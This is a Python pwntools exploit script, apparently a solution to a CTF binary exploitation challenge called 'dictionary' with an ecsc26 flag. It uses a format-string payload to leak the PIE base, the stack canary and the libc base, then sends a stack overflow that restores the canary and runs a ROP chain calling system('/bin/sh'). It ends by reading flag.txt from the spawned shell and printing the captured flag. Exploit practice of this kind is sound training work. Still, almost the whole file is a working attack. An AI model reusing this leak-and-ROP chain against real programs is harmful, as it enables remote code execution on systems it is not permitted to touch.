#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
libc = exe.libc
context.terminal = ["tmux", "splitw", "-h"]
# context.encoding = 'utf-8'

gdbscript = '''
# brva 0x1C65
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie
logleak = lambda **k: [success(f"{k}: {v:#x}") for k, v in k.items()]
has_space       = lambda data: any(c in {0x20, 0x09, 0x0a, 0x0b, 0x0c, 0x0d} for c in data)
is_scanf_safe   = lambda data: not has_space(data)
is_stream_safe  = lambda data: not has_space(data)
is_cin_safe     = lambda data: not has_space(data)
is_fgets_safe   = lambda data: (b'\n' not in data)
is_gets_safe    = lambda data: is_fgets_safe(data)
is_getline_safe = lambda data: is_fgets_safe(data)


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper

"""
[*] '/home/rivit/Downloads/hackcert/dictionary/dict'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
"""


@trace
def lookup(payload):
    sla(b"> ", b"1")
    sla(b"Word to translate", payload)

@trace
def quit():
    sla(b"> ", b"0")

lookup(flat(
    b'A' * 64,
    b'%1$llx %2$s %35$llx %37$llx %39$llx'
))

lookup(b'ctf')

ru(b'Sztandar')

leaks = rl().strip().decode().split(' ')

pie, canary, libc_leak = leaks[:3]
pie = int(pie, 16) - 0x1d92
canary = int(canary, 16)
libc_base = int(libc_leak, 16) - 0x2a601
logleak(pie=pie, canary=canary, libc=libc_base)

libc.address = libc_base
exe.address = pie

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

lookup(flat(
    b'A' * 0x88,
    canary,
    b'B' * 8,
    pop_rdi+1, # align stack
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    libc.sym.system,
    pop_rdi,
    0,
    libc.sym.exit
))

quit()

sl(b'cat flag.txt')

ia()


# ecsc26{we_4ll_l0ve_th3_3ur0pejskie_W1rtu4lne_Wyzw4ni3_B3zpieczn1k0we}


